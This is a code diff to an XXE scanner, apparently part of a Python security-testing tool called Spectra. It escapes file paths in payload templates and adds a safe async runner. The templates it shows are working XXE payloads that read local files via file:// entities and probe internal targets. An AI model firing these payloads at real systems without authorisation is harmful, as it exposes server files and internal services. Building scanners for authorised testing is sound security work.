@@ -29,6 +29,7 @@ import base64
 import hashlib
 import json
 from pathlib import Path
+from xml.sax.saxutils import escape as xml_attr_escape
 
 # Imports do Spectra
 from ..core.logger import get_logger
@@ -82,10 +83,11 @@ class XXEPayloadGenerator:
         ]
         
         for file_path in target_files:
+            safe_path = xml_attr_escape(file_path, {'"': '&quot;'})
             # Payload básico
             payload = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
-<!ENTITY xxe SYSTEM "file://{file_path}">
+<!ENTITY xxe SYSTEM "file://{safe_path}">
 ]>
 <root>&xxe;</root>'''
             
@@ -99,7 +101,7 @@ class XXEPayloadGenerator:
             # Payload com CDATA
             cdata_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
-<!ENTITY xxe SYSTEM "file://{file_path}">
+<!ENTITY xxe SYSTEM "file://{safe_path}">
 ]>
 <root><![CDATA[&xxe;]]></root>'''
             
@@ -131,9 +133,10 @@ class XXEPayloadGenerator:
         ]
         
         for target in internal_targets:
+            safe_target = xml_attr_escape(target, {'"': '&quot;'})
             payload = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
-<!ENTITY xxe SYSTEM "{target}">
+<!ENTITY xxe SYSTEM "{safe_target}">
 ]>
 <root>&xxe;</root>'''
             
@@ -1056,7 +1059,29 @@ async def xxe_scan(url: str, collaborator_url: Optional[str] = None,
     
     return None
 
+def _safe_run_async(coro):
+    """
+    Executa coroutine de forma segura em qualquer contexto
+    (dentro ou fora de um event loop ativo).
+    """
+    try:
+        # Tenta obter o loop corrente
+        loop = asyncio.get_event_loop()
+        if loop.is_running():
+            # Está dentro de um loop (ex: Jupyter, CLI com asyncio)
+            # Cria um loop separado numa thread
+            import concurrent.futures
+            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
+                future = pool.submit(asyncio.run, coro)
+                return future.result()
+        else:
+            return loop.run_until_complete(coro)
+    except RuntimeError:
+        # Sem loop ativo
+        return asyncio.run(coro)
+
+
 def xxe_scan_sync(url: str, **kwargs) -> Optional[List[XXEResult]]:
-    """Versão síncrona do scanner XXE."""
-    return asyncio.run(xxe_scan(url, **kwargs))
+    """Versão síncrona do scanner XXE — segura em event loops ativos."""
+    return _safe_run_async(xxe_scan(url, **kwargs))
 
